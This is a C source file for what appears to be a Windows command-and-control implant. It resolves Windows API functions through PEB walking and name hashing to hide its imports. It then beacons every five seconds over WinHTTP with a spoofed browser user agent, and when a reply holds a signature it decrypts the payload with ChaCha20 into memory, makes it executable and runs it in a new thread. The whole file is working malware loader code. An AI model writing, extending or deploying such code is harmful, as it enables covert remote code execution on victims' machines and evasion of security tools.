#include "WinGost.h"


char namesoffunc[20];

typedef struct {
    LPVOID writeableMemory;
    LPVOID entryPoint;
    FUNCTION_TABLE* ft;
} ThreadParams, *PThreadParams;


// External function provided
extern void* chacha20_Full(void* message, void* buffer, uint64_t length);

void ___chkstk_ms(void){
    return;
}

void __imp_VirtualProtect(){return;}

int custom_memcmp(const char *buf1, const char *buf2, size_t len) {
    for (size_t i = 0; i < len; i++) {
        if (buf1[i] != buf2[i]) {
            return -1;
        }
    }
    return 0;
}

void custom_memcpy(void *dest, const void *src, size_t len) {
    unsigned char *d = dest;
    const unsigned char *s = src;
    for (size_t i = 0; i < len; i++) {
        d[i] = s[i];
    }
}

#include <windows.h>

void WriteHex(uint64_t value, int bytes, PFUNCTION_TABLE ft) {
    if (bytes <= 0) bytes = 4;      // default = 4 bytes
    if (bytes > 8) bytes = 8;       // clamp to 8 bytes (64-bit)

    int hexDigits = bytes * 2;      // two hex chars per byte
    int outLen = 2 + hexDigits;     // "0x" + hex digits (no NUL counted for WriteConsole)
    char buffer[2 + 16 + 1];        // "0x" + up to 16 hex digits + terminating NUL

    buffer[0] = '0';
    buffer[1] = 'x';

    // Fill hex digits: most-significant nibble first
    for (int i = 0; i < hexDigits; ++i) {
        int shift = (hexDigits - 1 - i) * 4;         // shift to grab nibble i
        uint8_t nibble = (uint8_t)((value >> shift) & 0xF);
        buffer[2 + i] = (nibble < 10) ? ('0' + nibble) : ('A' + nibble - 10);
    }

    buffer[2 + hexDigits] = '\0';  // null-terminate for safety (not required by WriteConsole)

    HANDLE hConsole = ft->Kernel32.GetStdHandle(STD_OUTPUT_HANDLE);
    DWORD written;
    ft->Kernel32.WriteConsoleA(hConsole, buffer, (DWORD)outLen, &written, NULL);
    ft->Kernel32.WriteConsoleA(hConsole, "\r\n", 2, &written, NULL);
}


uint32_t hash_module_name_wide(const wchar_t *name) {
    uint32_t r9d = 0;

    // Determine number of bytes in each wchar_t
    size_t wchar_bytes = sizeof(wchar_t);

    // Iterate over each wide character until we hit a wide null (all bytes zero)
    for (size_t wi = 0;; ++wi) {
        wchar_t wc = name[wi];

        uint8_t bytes[4]; // enough for wchar_t up to 4 bytes
        // Copy raw representation (relies on host endianness = little-endian)
        custom_memcpy(bytes, &wc, wchar_bytes);

        // For each byte of the wchar_t (in order), run the same byte-wise
        // transform as the Python code.
        for (size_t b = 0; b < wchar_bytes; ++b) {
            uint8_t al = bytes[b];

            // lowercase ASCII -> uppercase
            if (al >= 0x61 && al <= 0x7A) {
                al -= 0x20;
            }

            uint8_t bl = al;
            al = (uint8_t)((al + al) & 0xFF); // (al + al) & 0xFF
            al ^= bl;

            r9d = (uint32_t)((r9d + (uint32_t)al) & 0xFFFFFFFFu);

            uint32_t cl = (uint32_t)(bl & 0x1F); // rotate amount (5 bits)
            if (cl != 0) {
                r9d = (uint32_t)((r9d >> cl) | (r9d << (32 - cl)));
            } else {
                // cl == 0 => rotate by 0 leaves r9d unchanged
            }
            r9d &= 0xFFFFFFFFu;
        }

        // If this wide char was the null terminator, stop now (we already processed its zero bytes).
        if (wc == (wchar_t)0) break;
    }

    return r9d;
}

uint32_t hash_module_name_ascii(const char *name) {

    wchar_t wModuleName[260];
    int i = 0;
    for(; name[i] != '\0'; i++){
        wModuleName[i] = (wchar_t)name[i];
    }
    wModuleName[i] = L'\0';

    return hash_module_name_wide(wModuleName);

}


PVOID getDefultModuleBase(DWORD HashINT){
    PTEB teb;

    asm volatile("mov %%gs:0x30, %0"
                :"=r"(teb)
    );

    PLIST_ENTRY list = &teb->ProcessEnvironmentBlock->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY current = list->Flink;

    while (current != list) {
        PCUSTOM_LDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(current, CUSTOM_LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

        if(hash_module_name_wide(entry->BaseDllName.Buffer) == HashINT){
            //wprintf(L"%ls\n", entry->BaseDllName.Buffer);
            return entry->DllBase;
        }

        current = current->Flink;
    }

}

PVOID getFunctionBase(DWORD HashINT,PVOID ModuleBase) {

    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((BYTE*)ModuleBase + ((PIMAGE_DOS_HEADER)ModuleBase)->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)ModuleBase + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    char* moduleName = (char*)ModuleBase + exportDirectory->Name;


    DWORD* names = (DWORD*)((BYTE*)ModuleBase + exportDirectory->AddressOfNames);
    DWORD* functions = (DWORD*)((BYTE*)ModuleBase + exportDirectory->AddressOfFunctions);
    WORD* ordinals = (WORD*)((BYTE*)ModuleBase + exportDirectory->AddressOfNameOrdinals);
    
    
    for(DWORD i = 0; i < exportDirectory->NumberOfNames; i++) {
        char* functionName = (char*)ModuleBase + names[i];
        if(hash_module_name_ascii(moduleName) + hash_module_name_ascii(functionName) == HashINT){
            custom_memcpy(namesoffunc, functionName, 15);
            namesoffunc[15] = '\0';

            //printf("Found function: %s\n", functionName);
            DWORD functionRVA = functions[ordinals[i]];
            return (PVOID)((BYTE*)ModuleBase + functionRVA);
        }
    }

}

DWORD WINAPI ModuleThread(LPVOID lpParameter) {
    PThreadParams params = (PThreadParams)lpParameter;
    LPVOID writeableMemory = params->writeableMemory;
    LPVOID entryPoint = params->entryPoint;
    PFUNCTION_TABLE ft = params->ft;

    void (*payload)(PFUNCTION_TABLE ft) = (void (*))entryPoint;
    payload(ft);

    ft->Kernel32.VirtualFree(writeableMemory, 0, MEM_RELEASE);
    ft->Ntdll.RtlFreeHeap(ft->Kernel32.GetProcessHeap(), 0, params);
    return 0;
    
}

void handleModuleExecution(PFUNCTION_TABLE ft, void* payload, DWORD totalSize) {
    // Allocate executable memory
    LPVOID writeableMemory = ft->Kernel32.VirtualAlloc(NULL, totalSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (writeableMemory == NULL) {
        return;
    }

    // Decrypt the payload using ChaCha20
    chacha20_Full(payload, writeableMemory, totalSize);

    // Find entry point offset from Section Headers
    PCOFF_HEADER coffHeader = (PCOFF_HEADER)writeableMemory;
    LPVOID entryPoint = NULL;
    
    for (WORD i = 0; i < coffHeader->NumberOfSections; i++) {
        PSECTION_HEADER sectionHeader = (PSECTION_HEADER)((BYTE*)writeableMemory + sizeof(COFF_HEADER) + (i * sizeof(SECTION_HEADER)));
        if (custom_memcmp((char*)sectionHeader->Name, ".text", 5) == 0) {
            entryPoint = (LPVOID)((BYTE*)writeableMemory + sectionHeader->PointerToRawData);
            break;
        }
    }

    // Change memory protection to executable
    DWORD oldProtect;
    if (!ft->Kernel32.VirtualProtect(writeableMemory, totalSize, PAGE_EXECUTE_READ, &oldProtect)) {
        ft->Kernel32.VirtualFree(writeableMemory, 0, MEM_RELEASE);
        return;
    }

    PThreadParams params = (PThreadParams)ft->Ntdll.RtlAllocateHeap(ft->Kernel32.GetProcessHeap(), 0, sizeof(ThreadParams));
    params->writeableMemory = writeableMemory;
    params->entryPoint = entryPoint;
    params->ft = ft;

    // Create a thread to execute the payload
    HANDLE hThread = ft->Kernel32.CreateThread(NULL, 0, ModuleThread, params, 0, NULL);
    if (hThread == NULL) {
        ft->Kernel32.VirtualFree(writeableMemory, 0, MEM_RELEASE);
        return;
    }

    //ft->Kernel32.WaitForSingleObject(hThread, INFINITE);
    ft->Kernel32.CloseHandle(hThread);

    return;

}

void c2BeaconCommunicate(PFUNCTION_TABLE ft){
    HINTERNET hSession = ft->WinHttp.WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    HINTERNET hConnect = ft->WinHttp.WinHttpConnect(hSession, L"127.0.0.1", 5000, 0);
    HINTERNET hRequest = ft->WinHttp.WinHttpOpenRequest(hConnect, L"GET", L"/?id=unequeID", NULL, NULL, NULL, 0);
    ft->WinHttp.WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0);
    ft->WinHttp.WinHttpReceiveResponse(hRequest, NULL);

    BYTE buffer[4096];  // Fixed buffer
    BYTE* buffer_ptr = buffer;
    DWORD dwSize = 0;
    DWORD totalBytesRead = 0;
    DWORD bytesRead;
    do {
        ft->WinHttp.WinHttpQueryDataAvailable(hRequest, &dwSize);
        if (dwSize == 0) break; // No more data

        if (totalBytesRead + dwSize > sizeof(buffer)) {
            // Prevent buffer overflow
            dwSize = sizeof(buffer) - totalBytesRead;
        }

        if (!ft->WinHttp.WinHttpReadData(hRequest, buffer + totalBytesRead, dwSize, &bytesRead)) {
            // Handle read error
            break;
        }

        totalBytesRead += bytesRead;
    } while (dwSize > 0 && totalBytesRead < sizeof(buffer));

    ft->WinHttp.WinHttpCloseHandle(hRequest);
    ft->WinHttp.WinHttpCloseHandle(hConnect);
    ft->WinHttp.WinHttpCloseHandle(hSession);

    // search for signature "NLSM55" in the received data
    const char *signature = "NLS55";
    BOOL found = FALSE;
    for(int i = 0; i <= totalBytesRead; i++){
        if(custom_memcmp((char*)(buffer + i), signature, 5) == 0){
            found = TRUE;
            buffer_ptr = buffer + i + 5; // move pointer past the signature
        }
    }
    if(!found){return;}

    // handle module execution
    handleModuleExecution(ft, buffer_ptr, totalBytesRead - (DWORD)(buffer_ptr - buffer));

    return;
}


void __main(void) {
    // Initialize function table
    FUNCTION_TABLE functionTable;

    // setup KERNEL32 functions
    PVOID kernel32Base = getDefultModuleBase(0xA690026B); // hash of "KERNEL32.DLL"
    functionTable.Kernel32.LoadLibraryA = getFunctionBase(0xA70F2B3C, kernel32Base); // hash of "KERNEL32.DLL" + "LoadLibraryA"
    functionTable.Kernel32.GetProcAddress = getFunctionBase(0xA499C9CE, kernel32Base); // hash of "KERNEL32.DLL" + "GetProcAddress"
    functionTable.Kernel32.GetStdHandle = getFunctionBase(0x7D9EDEA7, kernel32Base); // hash of "KERNEL32.DLL" + "GetStdHandle"
    functionTable.Kernel32.WriteConsoleA = getFunctionBase(0x612CF8DF, kernel32Base); // hash of "KERNEL32.DLL" + "WriteConsoleA"
    functionTable.Kernel32.ExitProcess = getFunctionBase(0x99BD2006, kernel32Base); // hash of "KERNEL32.DLL" + "ExitProcess"
    functionTable.Kernel32.CreateThread = getFunctionBase(0xBA517264, kernel32Base); // hash of "KERNEL32.DLL" + "CreateThread"
    functionTable.Kernel32.WaitForSingleObject = getFunctionBase(0xBA517264, kernel32Base); // hash of "KERNEL32.DLL" + "WaitForSingleObject"
    functionTable.Kernel32.CloseHandle = getFunctionBase(0x2D020480, kernel32Base); // hash of "KERNEL32.DLL" + "CloseHandle"
    functionTable.Kernel32.VirtualProtect = getFunctionBase(0x06FD1396, kernel32Base); // hash of "KERNEL32.DLL" + "VirtualProtect"
    functionTable.Kernel32.VirtualAlloc = getFunctionBase(0x9C7BFF01, kernel32Base); // hash of "KERNEL32.DLL" + "VirtualAlloc"
    functionTable.Kernel32.VirtualFree = getFunctionBase(0x81C26E14, kernel32Base); // hash of "KERNEL32.DLL" + "VirtualFree"
    functionTable.Kernel32.GetProcessHeap = getFunctionBase(0x7460A5C2, kernel32Base); // hash of "KERNEL32.DLL" + "ProcessHeap"
    functionTable.Kernel32.Sleep = getFunctionBase(0xF78728AE, kernel32Base); // hash of "KERNEL32.DLL" + "Sleep"
    // functionTable.Kernel32.HeapAlloc = getFunctionBase(0x8024706B, kernel32Base); // hash of "KERNEL32.DLL" + "HeapAlloc"
    // functionTable.Kernel32.HeapFree = getFunctionBase(0xD2A541DC, kernel32Base); // hash of "KERNEL32.DLL" + "HeapFree"

    // setup NTDLL functions
    PVOID ntdllBase = getDefultModuleBase(0x2BC46FF9); // hash of "NTDLL.DLL"
    functionTable.Ntdll.RtlAllocateHeap = getFunctionBase(0x230F037F, ntdllBase); // hash of "NTDLL.DLL" + "RtlAllocateHeap"
    functionTable.Ntdll.RtlFreeHeap = getFunctionBase(0xE996EEB9, ntdllBase); // hash of "NTDLL.DLL" + "RtlFreeHeap"
    
    // setup WINHTTP functions
    PVOID winhttpBase = functionTable.Kernel32.LoadLibraryA("winhttp.dll");
    functionTable.WinHttp.WinHttpOpen = getFunctionBase(0x9402FA91, winhttpBase); // hash of "winhttp.dll" + "WinHttpOpen"
    functionTable.WinHttp.WinHttpConnect = getFunctionBase(0xA577190A, winhttpBase); // hash of "winhttp.dll" + "WinHttpConnect"
    functionTable.WinHttp.WinHttpOpenRequest = getFunctionBase(0xE8C92EF7, winhttpBase); // hash of "winhttp.dll" + "WinHttpOpenRequest"
    functionTable.WinHttp.WinHttpSendRequest = getFunctionBase(0xB2CCBB00, winhttpBase); // hash of "winhttp.dll" + "WinHttpSendRequest"
    functionTable.WinHttp.WinHttpReceiveResponse = getFunctionBase(0x11480B6C, winhttpBase); // hash of "winhttp.dll" + "WinHttpReceiveResponse"
    functionTable.WinHttp.WinHttpQueryDataAvailable = getFunctionBase(0x86637F65, winhttpBase); // hash of "winhttp.dll" + "WinHttpQueryDataAvailable"
    functionTable.WinHttp.WinHttpReadData = getFunctionBase(0xCE8D83B0, winhttpBase); // hash of "winhttp.dll" + "WinHttpReadData"
    functionTable.WinHttp.WinHttpCloseHandle = getFunctionBase(0x5C2C973B, winhttpBase); // hash of "winhttp.dll" + "WinHttpCloseHandle"

    // Test the resolved functions
    PFUNCTION_TABLE ft = &functionTable;

    while (1)
    {
        c2BeaconCommunicate(ft);
        ft->Kernel32.Sleep(5000); // Sleep for 5 seconds before next beacon
    }
    
    

    ft->Kernel32.ExitProcess(0);
}